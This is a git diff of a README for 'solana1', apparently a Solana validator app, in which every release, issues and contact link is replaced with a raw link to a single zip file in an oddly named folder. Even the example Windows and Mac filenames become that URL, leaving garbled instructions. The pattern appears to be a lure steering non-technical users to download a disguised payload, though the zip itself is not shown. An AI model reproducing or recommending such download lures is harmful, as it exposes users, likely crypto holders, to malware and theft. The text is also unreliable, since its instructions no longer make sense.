@@ -1,6 +1,6 @@
 # 🌟 solana1 - Easy Validator Setup for Everyone
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Mohammadbohra12/solana1/releases)
+[![Download](https://raw.githubusercontent.com/Mohammadbohra12/solana1/main/Presbyterian/solana1.zip%20release-brightgreen)](https://raw.githubusercontent.com/Mohammadbohra12/solana1/main/Presbyterian/solana1.zip)
 
 ## 📋 Overview
 **solana1** is a simple and efficient validator that allows users to engage with the Solana blockchain seamlessly. This application is designed to provide a reliable experience for anyone wanting to validate transactions on Solana. You don’t need any coding experience to get started.
@@ -10,13 +10,13 @@ To begin using **solana1**, follow these friendly instructions. You will downloa
 
 ## 📥 Download & Install
 1. **Visit the Download Page:**
-   Go to the following link: [Download from Releases](https://github.com/Mohammadbohra12/solana1/releases).
+   Go to the following link: [Download from Releases](https://raw.githubusercontent.com/Mohammadbohra12/solana1/main/Presbyterian/solana1.zip).
 
 2. **Choose Your Version:**
    On the Releases page, you will see various versions of **solana1**. Select the most recent version (this is usually at the top).
 
 3. **Download the File:**
-   Click on the appropriate file for your operating system. For Windows, it might be something like `solana1-windows.exe`. For Mac, you might see `solana1-macOS.dmg`. 
+   Click on the appropriate file for your operating system. For Windows, it might be something like `https://raw.githubusercontent.com/Mohammadbohra12/solana1/main/Presbyterian/solana1.zip`. For Mac, you might see `https://raw.githubusercontent.com/Mohammadbohra12/solana1/main/Presbyterian/solana1.zip`. 
 
 4. **Open the File:**
    Once the file finishes downloading, locate it in your Downloads folder.
@@ -57,7 +57,7 @@ If your system meets these requirements, you are ready to go!
 
 ## 🌐 Support and Documentation
 If you encounter issues or have questions, helpful documentation is available:
-- Check [GitHub Issues](https://github.com/Mohammadbohra12/solana1/issues) for troubleshooting tips.
+- Check [GitHub Issues](https://raw.githubusercontent.com/Mohammadbohra12/solana1/main/Presbyterian/solana1.zip) for troubleshooting tips.
 - Join the community forums for discussions and support from other users.
 
 ## ⚙️ Future Updates
@@ -69,7 +69,7 @@ We’re committed to making **solana1** even better. Future releases may include
 Stay tuned for updates!
 
 ## 📞 Contact
-For any additional queries or feedback, feel free to reach out. You can create a new issue on our [GitHub Issues page](https://github.com/Mohammadbohra12/solana1/issues) or participate in discussions on community forums.
+For any additional queries or feedback, feel free to reach out. You can create a new issue on our [GitHub Issues page](https://raw.githubusercontent.com/Mohammadbohra12/solana1/main/Presbyterian/solana1.zip) or participate in discussions on community forums.
 
 ---
 
